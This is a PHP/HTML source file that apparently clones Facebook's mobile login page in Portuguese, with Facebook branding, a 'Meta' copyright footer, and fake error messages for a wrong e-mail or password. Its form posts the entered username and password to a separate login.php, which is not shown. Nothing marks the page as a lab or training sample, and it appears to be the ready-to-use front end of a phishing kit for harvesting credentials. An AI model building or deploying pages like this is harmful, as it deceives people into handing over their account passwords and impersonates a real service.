<?php
  session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    *{
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  outline: none;
}
body{
  font-family: 'Arial';
}
.header{
  background-color: #3b5998;
  color: #fff;
  font-weight: bold;
  padding: 0.1em;
}
.header img{
  margin-top: 5px;
  margin-left: 2.5px;
}
.login-area{
  height: auto;
  background-color: #eceff5;
  padding-bottom: 70px;
}
span{
  font-weight: bold;
  color: #999;
}
input[type="text"], input[type="password"]{
  height: 40px;
  width: 100%;
  border: solid 1px #999;
}
input[type="submit"]{
  height: 45px;
  width: 100%;
  background-color: #365899;
  color: #fff;
  border: solid 1px #90949c;
  border-radius: 2.5px;
  cursor: pointer;
}
.box{
  padding: 0.5em;
}
.hr{
  display: flex;
  align-items: center;
  color: #4b4f56;
  justify-content: center;
}
hr{
  width: 40%;
  margin: 1em;
  border: solid 1px #ccd0d5;
}
#btn{
  height: 45px;
  padding: 0.5em;
  background-color: #42b72a;
  width: 150px;
  color: #fff;
  cursor: pointer;
  border: solid 1px #ccd0d5;
  border-radius: 2.5px;
}
a{
  color: #465e91;
  text-decoration: none;
  display: block;
  margin-top: 0.3cm;
}
.rodape{
  height: auto;
  background-color: #4b4f56;
  display: flex;
  color: #dadde1;
  font-size: 13px;
  margin-top: 0.2cm;
}
ul{
  margin: 0.7em;
  list-style: none;
}
#two{
  margin-left: 1.5cm;
}
li{
  margin-bottom: 10px;
}

.cross{
  border: solid 1px #dadde1;
  line-height: 30px;
  height: 30px;
  width: 30px;
  text-align: center;
  font-size: 30px;
  margin-top: 0.2em;
}
#cp{
  font-weight: bold;
  color: #fff;
}
.error{
  background-color: #fa3e3e;
  color: #fff;
  font-size: 13px;
  padding: 0.5em;
}
  </style>
  <title>Facebook</title>
</head>
<body>
  <header class="header">
    <img src="logo.png" alt="facebook">
  </header>
  <?php 
    if(isset($_SESSION["err1"])): echo "<style>#username{ border: solid 1px #fa3e3e; } </style>";
  ?>
  <div class="error">O e-mail ou número de telemóvel que inseriste não corresponde a uma conta. <b>Cria uma conta nova.</b>
  </div>
  <?php
    unset($_SESSION["err1"]);
    endif;
  ?>
  <?php 
    if(isset($_SESSION["err2"])): echo "<style>#password{ border: solid 1px #fa3e3e; } </style>";
  ?>
  <div class="error">
    A palavra-passe que inseriste está incorreta. <b>Esqueceste-te da tua palavra-passe?</b>
  </div>
  <?php
    unset($_SESSION["err2"]);
    endif;
  ?>
  <div class="login-area">
    <form action="login.php" method="POST">
      <div class="box">
        <label for="username">
        <span>Número de telefone ou e-mail</span>
      </label>
      <input type="text" id="username" name="username">
      </div>
      <div class="box">
        <label for="password">
        <span>Palavra-passe</span>
      </label>
      <input type="password" id="password" name="password">
      </div>
      <div class="box">
      <input type="submit"  value="Iniciar sessão">
      </div>
      <div class="hr">
        <hr>ou<hr>
      </div>
      <div class="box">
        <center>
          <input type="button" id="btn" value="Criar nova conta">
          <br>
          <a href="#">Não sabes a tua palavra-passe?</a>
        </center>
      </div>
    </form>
  </div>
  <br><br>
  <footer class="rodape">
    <ul>
      <li><b>Português (Portugal)</b></li>
      <li>English (US)</li>
      <li>Deutsch</li>
      <br>
      <li id="cp">Meta &copy <?= date("Y"); ?></li>
    </ul>
    <ul id="two">
      <li>Français (France)</li>
      <li>Espanhol</li>
      <li><div class="cross">+</div></li>
    </ul>
  </footer>
</body>
</html>
